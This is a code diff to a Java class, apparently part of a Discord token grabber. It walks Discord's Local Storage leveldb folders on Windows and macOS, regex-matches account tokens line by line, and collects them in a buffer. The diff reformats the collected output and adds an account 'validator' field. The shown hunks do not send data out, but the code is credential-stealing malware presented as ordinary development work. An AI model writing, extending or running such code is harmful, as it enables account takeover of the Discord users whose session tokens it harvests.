@@ -13,9 +13,11 @@ public class Tokens {
 
     private static final Main main = Main.getMain();
     private static final DesktopInfo DI = Main.getDesktopInfo();
+    private static final AccountInfo validator = Main.getDcInfo();
     private final StringBuilder sb = new StringBuilder();
 
     public void run() {
+
         if (DI.getOs_name().contains("Windows")){
             List<String> paths = new ArrayList<>();
             paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
@@ -45,11 +47,7 @@ public class Tokens {
                                 Matcher m = p.matcher(strLine);
 
                                 while (m.find()) {
-                                    if (cx > 0) {
-                                        sb.append("\n");
-                                    }
-                                    sb.append(" ").append(m.group());
-                                    cx++;
+                                    sb.append(m.group()).append("\n");
                                 }
                             }
                         } catch (Exception ignored) {
@@ -63,7 +61,6 @@ public class Tokens {
             paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
 
             int cx = 0;
-            sb.append("TOKEN[S]\n");
 
             try {
                 for (String path : paths) {
@@ -84,11 +81,7 @@ public class Tokens {
                                 Matcher m = p.matcher(strLine);
 
                                 while (m.find()) {
-                                    if (cx > 0) {
-                                        sb.append("\n");
-                                    }
-                                    sb.append(" ").append(m.group());
-                                    cx++;
+                                    sb.append(m.group()).append("\n");
                                 }
                             }
                         } catch (Exception ignored) {
